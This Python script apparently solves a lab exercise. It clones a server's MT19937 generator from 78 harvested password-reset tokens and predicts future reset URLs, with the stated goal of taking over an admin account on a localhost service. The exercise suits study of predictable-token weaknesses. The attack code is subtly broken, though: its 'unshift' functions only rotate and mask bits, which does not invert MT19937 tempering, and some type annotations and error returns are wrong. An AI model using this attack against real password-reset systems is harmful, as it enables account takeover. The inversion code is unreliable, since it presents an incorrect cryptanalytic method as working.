import requests
from bs4 import BeautifulSoup
from MT19937 import MT19937
from utils import *

"""
Next, break the generator from observed values, even if the seed is unknown. The internal state of MT19937 consists of 624, 32-bit values. 
Each time MT19937 is tapped for output, one of these values is “mixed,” (via extract_number) defusing its bits through the result. 
This mixing function, however, is invertible, allowing one to write an “un-mix” function that simply applies the inverse of each transform in reverse order.
Write this un-mix function. Now, by requesting 78 (624/8) consecutive password reset tokens (e.g. on an account you own), you can “un-mix” each of them to 
recreate the initial state of the generator. Using this initial state, you can clone the server's MT19937, run it forward, and predict all future password reset tokens. 
Demonstrate this by resetting the admin user's password and logging in as her
"""

def unshift_left(mt: MT19937, y: int, shift: int, mask: int) -> int:
    """
    Unshift left
    """
    result = 0
    for i in range(mt.w):
        bit = (y >> ((i + shift) % mt.w)) & 1
        result |= bit << i
    return result & mask


def unshift_right(mt: MT19937, y: int, shift: int, mask: int) -> int:
    """
    Unshift right
    """
    result = 0
    for i in range(mt.w):
        bit = (y >> i) & 1
        result |= bit << ((i - shift) % mt.w)
    return result & mask


def unmix_value(mt: MT19937, token: int) -> int:
    """
    Unmix a value of the MT19937 PRNG
    Apply the inverse of each transform in reverse order
    """
    y = token
    # untemper the value by applying the inverse of each transform in reverse order
    y = unshift_right(mt, y, mt.l, ((1 << mt.w) - 1))
    y = unshift_left(mt, y, mt.t, mt.c)
    y = unshift_left(mt, y, mt.s, mt.b)
    y = unshift_right(mt, y, mt.u, mt.d)
    return y


def unmix(mt: MT19937, tokens: list[int]) -> None:
    """
    Unmix the internal state of the MT19937 PRNG
    """
    # iterate over the internal state of the MT19937 PRNG and unmix each value
    for i in range(mt.n):
        mt.MT[i] = unmix_value(mt, tokens[i])
        # x = (mt.MT[i] & mt.upper_mask) + (mt.MT[(i + 1) % mt.n] & mt.lower_mask)
        # xA = x >> 1
        # if (x % 2) != 0:
        #     xA = xA ^ mt.a
        # mt.MT[i] = mt.MT[(i + mt.m) % mt.n] ^ xA
    mt.index = 624 # reset index to seed the MT19937 PRNG


def split_password_reset_token(decoded_token: str) -> int:
    """
    Split the password reset token into 8 32-bit integers
    """
    return [int(i) for i in decoded_token.split(":")]


def request_password_reset_tokens(username) -> list[int]:
    """
    Request a password reset token
    """
    tokens = []
    try:
        for i in range(78):
            resp = requests.post("http://localhost:8080/forgot", data={"user": username})
            soup = BeautifulSoup(resp.text, "html.parser")
            token = soup.find("font").text.split("token=")[1]
            decoded_token = base64_to_bytes(token).decode("utf-8")
            # split the decoded string by the : delimiter and convert each value to an int
            tokens.extend(split_password_reset_token(decoded_token))
    except Exception as e:
        print("Error: ", e)
        return -1
    return tokens


def predict_next_password_reset_token(mt: MT19937) -> str:
    """
    Predict the next password reset token
    """
    token_parts = []
    for i in range(8):
        token_parts.append(str(mt.extract_number()))
    token = ":".join(token_parts).encode("utf-8")
    return token



def break_password_reset() -> None:
    """
    Break the password reset function
    """
    username = input("Enter the username: ")
    # generate 78 (624/8) password reset tokens
    password_reset_tokens = request_password_reset_tokens(username)
    print("Password Reset Tokens length: ", len(password_reset_tokens))

    # clone the server's MT19937 given the generated tokens
    dummy_seed = 0
    mt = MT19937(dummy_seed.to_bytes(4, byteorder="big"))
    unmix(mt, password_reset_tokens)
    print("MT19937 Cloned: ", mt)

    # predict all future password reset tokens
    while True:
        if input("Predict the next password reset token? (y/n): ") == "n":
            break
        next_token = predict_next_password_reset_token(mt)
        req_url = "http://localhost:8080/reset?token=" + bytes_to_base64(next_token)      
        print("Request URL: ", req_url)
    

def main():
    break_password_reset()

if __name__ == "__main__":
    main()
